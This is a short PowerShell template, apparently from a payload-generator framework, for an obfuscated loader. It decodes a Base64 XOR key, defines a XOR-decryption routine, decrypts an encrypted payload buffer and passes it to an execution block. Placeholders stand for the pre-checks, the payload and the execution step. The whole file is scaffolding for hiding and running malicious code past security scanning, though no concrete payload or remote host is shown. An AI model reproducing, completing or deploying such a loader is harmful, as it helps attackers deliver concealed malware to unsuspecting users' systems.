{{PRE_CHECKS}}
{{V_KEY}} = [Convert]::FromBase64String("{{XOR_KEY_B64}}")
{{PAYLOAD_BLOCK}}

function {{FN_DECRYPT}}([byte[]]$data, [byte[]]$key) {
    $out = New-Object byte[] $data.Length
    for ($i=0; $i -lt $data.Length; $i++) {
        $out[$i] = $data[$i] -bxor $key[$i % $key.Length]
    }
    return $out
}

{{V_BUF}} = {{FN_DECRYPT}} {{V_ENC}} {{V_KEY}}

{{EXE_BLOCK}}
